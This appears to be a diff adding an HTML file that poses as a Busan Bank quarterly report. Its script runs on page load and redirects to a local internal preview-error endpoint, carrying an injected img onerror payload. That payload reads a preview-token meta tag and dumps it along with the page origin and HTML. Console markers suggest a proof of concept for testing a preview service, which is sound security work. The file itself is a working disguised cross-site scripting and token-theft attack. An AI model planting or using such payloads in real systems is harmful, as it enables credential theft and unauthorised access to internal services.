@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="ko"><head><meta charset="UTF-8"><title>부산은행 분기보고서</title></head>
+<body>
+<h1>부산은행 분기보고서 자산총계 145,234,567 백만원</h1>
+<script>
+try {
+  console.log("SELFJS_RAN origin=" + location.origin + " href=" + location.href);
+  var inj = "<img src=x onerror=\"" +
+    "console.log('IPEXSS_ORIGIN='+location.origin);" +
+    "var m=document.querySelector('meta[name=finsight-preview-token]');" +
+    "console.log('IPEXSS_TOKEN='+(m?m.content:'NONE'));" +
+    "console.log('IPEXSS_HTML='+document.documentElement.outerHTML.slice(0,600).replace(/\s+/g,' '));" +
+    "\">";
+  var u = "http://127.0.0.1:8000/internal/preview/error?message=" + encodeURIComponent(inj);
+  console.log("SELFJS_NAV " + u.slice(0,80));
+  location.href = u;
+} catch (e) { console.log("SELFJS_ERR=" + e.message); }
+</script>
+</body></html>
